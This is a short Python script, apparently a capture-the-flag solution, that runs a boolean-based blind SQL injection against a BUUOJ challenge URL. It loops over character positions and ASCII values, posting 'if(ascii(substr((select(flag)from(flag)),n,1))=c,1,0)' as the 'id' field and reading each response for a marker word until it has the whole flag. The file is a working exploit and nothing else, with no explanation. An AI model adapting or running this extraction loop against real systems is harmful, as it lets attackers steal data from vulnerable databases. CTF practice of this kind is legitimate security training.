import requests

url='http://f4b59740-c8e4-4653-a1fd-e2be614665d2.node4.buuoj.cn:81/index.php'
result=''

for l in range(1,43):
    for i in range(32,128):
        payload='if((ascii(substr((select(flag)from(flag)),%d,1))=%d),1,0)'%(l,i)
        data={'id':payload}
        res=requests.post(url,data=data)
        #res.encoding=res.apparent_encoding
        if 'girlfriend' in res.text:
            result+=chr(i)
            print(result)
            break
        if '}' in result:
            break
    if '}' in result:
        break
print(result)